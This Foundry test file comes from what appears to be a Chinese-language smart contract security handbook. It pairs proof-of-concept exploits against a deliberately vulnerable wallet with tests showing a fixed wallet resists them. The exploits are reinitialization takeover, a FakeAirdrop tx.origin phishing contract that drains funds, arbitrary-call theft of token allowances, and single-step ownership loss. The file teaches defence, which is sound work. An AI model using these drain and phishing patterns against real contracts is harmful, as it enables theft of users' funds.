// SPDX-License-Identifier: MIT
// 配套章节：05 访问控制与权限 ｜ 被测合约：practice-example-code/02-AccessControl.sol
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableWallet, SafeWallet} from "handbook/02-AccessControl.sol";
import {EIP1967Proxy} from "handbook/07-ProxyStorage.sol";
import {ToyERC20} from "../src/ToyERC20.sol";

interface IWithdrawAll {
    function withdrawAll(address payable to) external;
}

/// @notice 钓鱼合约：受害者调用 claim，合约转而调用钱包
contract FakeAirdrop {
    IWithdrawAll public immutable wallet;
    address payable public immutable thief;

    constructor(IWithdrawAll _wallet, address payable _thief) {
        wallet = _wallet;
        thief = _thief;
    }

    function claim() external {
        wallet.withdrawAll(thief);
    }
}

contract AccessControlTest is Test {
    VulnerableWallet vuln;
    SafeWallet safe; // 通过代理访问
    ToyERC20 token;
    address owner = makeAddr("owner");
    address admin = makeAddr("proxyAdmin");
    address payable attacker = payable(makeAddr("attacker"));
    address victim = makeAddr("victim");

    function setUp() public {
        vuln = new VulnerableWallet();
        vuln.initWallet(owner);
        vm.deal(address(vuln), 10 ether);

        SafeWallet impl = new SafeWallet();
        EIP1967Proxy proxy = new EIP1967Proxy(address(impl), admin, abi.encodeCall(SafeWallet.initialize, (owner)));
        safe = SafeWallet(payable(address(proxy)));
        vm.deal(address(safe), 10 ether);

        token = new ToyERC20();
        token.mint(victim, 100 ether);
        vm.startPrank(victim);
        token.approve(address(vuln), type(uint256).max);
        token.approve(address(safe), type(uint256).max);
        vm.stopPrank();
    }

    function test_PoC_ReinitializeStealsWallet() public {
        vm.startPrank(attacker, attacker);
        vuln.initWallet(attacker);
        vuln.withdrawAll(attacker);
        vm.stopPrank();
        assertEq(vuln.owner(), attacker);
        assertEq(attacker.balance, 10 ether);
    }

    function test_Fixed_ReinitializeReverts() public {
        vm.prank(attacker);
        vm.expectRevert("already initialized");
        safe.initialize(attacker);
        assertEq(safe.owner(), owner);
    }

    function test_Fixed_ImplementationCannotBeInitialized() public {
        SafeWallet impl = new SafeWallet();
        vm.prank(attacker);
        vm.expectRevert("already initialized");
        impl.initialize(attacker);
    }

    function test_PoC_TxOriginPhishing() public {
        FakeAirdrop phish = new FakeAirdrop(IWithdrawAll(address(vuln)), attacker);
        vm.prank(owner, owner);
        phish.claim();
        assertEq(attacker.balance, 10 ether, "owner tricked, wallet drained");
    }

    function test_Fixed_TxOriginPhishingReverts() public {
        FakeAirdrop phish = new FakeAirdrop(IWithdrawAll(address(safe)), attacker);
        vm.prank(owner, owner);
        vm.expectRevert("not owner");
        phish.claim();
        assertEq(address(safe).balance, 10 ether);
    }

    function test_PoC_ArbitraryCallSpendsAllowance() public {
        vm.prank(attacker);
        vuln.execute(address(token), abi.encodeCall(ToyERC20.transferFrom, (victim, attacker, 100 ether)));
        assertEq(token.balanceOf(attacker), 100 ether);
    }

    function test_Fixed_ArbitraryCallReverts() public {
        vm.prank(attacker);
        vm.expectRevert("not owner");
        safe.execute(address(token), abi.encodeCall(ToyERC20.transferFrom, (victim, attacker, 100 ether)));
        // 即使 owner 误调用，未加入白名单的目标也被拒绝
        vm.prank(owner);
        vm.expectRevert("target not allowed");
        safe.execute(address(token), abi.encodeCall(ToyERC20.transferFrom, (victim, attacker, 100 ether)));
        assertEq(token.balanceOf(victim), 100 ether);
    }

    function test_PoC_SingleStepTransferLosesOwnership() public {
        address typo = makeAddr("mistyped");
        vm.prank(owner);
        vuln.transferOwnership(typo);
        assertEq(vuln.owner(), typo, "owner immediately replaced");
    }

    function test_Fixed_TwoStepTransferKeepsOwnership() public {
        address typo = makeAddr("mistyped");
        vm.prank(owner);
        safe.transferOwnership(typo);
        assertEq(safe.owner(), owner, "owner unchanged until accepted");
        vm.prank(attacker);
        vm.expectRevert("not pending owner");
        safe.acceptOwnership();
    }

    function testFuzz_NonOwnerCannotWithdraw(address caller) public {
        vm.assume(caller != owner && caller != admin);
        vm.prank(caller);
        vm.expectRevert("not owner");
        safe.withdrawAll(payable(caller));
    }
}
